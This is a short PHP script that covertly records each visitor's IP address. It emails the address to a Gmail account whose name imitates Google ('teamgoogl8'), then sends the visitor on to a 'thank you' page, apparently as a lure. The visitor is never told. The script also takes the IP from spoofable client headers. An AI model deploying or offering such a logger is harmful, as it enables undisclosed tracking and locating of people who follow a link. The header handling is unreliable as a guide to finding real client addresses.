<?php

// Function to get the user IP address
function getUserIP()
{
    // Check for shared internet connection
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IPs passing through proxies
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Get the user IP address
$userIP = getUserIP();

// Prepare the email message
$to = 'teamgoogl8@gmail.com';
$subject = 'IP Address Retrieved';
$message = 'The user IP address is: ' . $userIP;
$headers = 'From: noreply@yourdomain.com' . "\r\n" .
    'Reply-To: noreply@yourdomain.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Send the email
mail($to, $subject, $message, $headers);

// Redirect the user to a thank you page
header('Location: thankyou.php');
exit;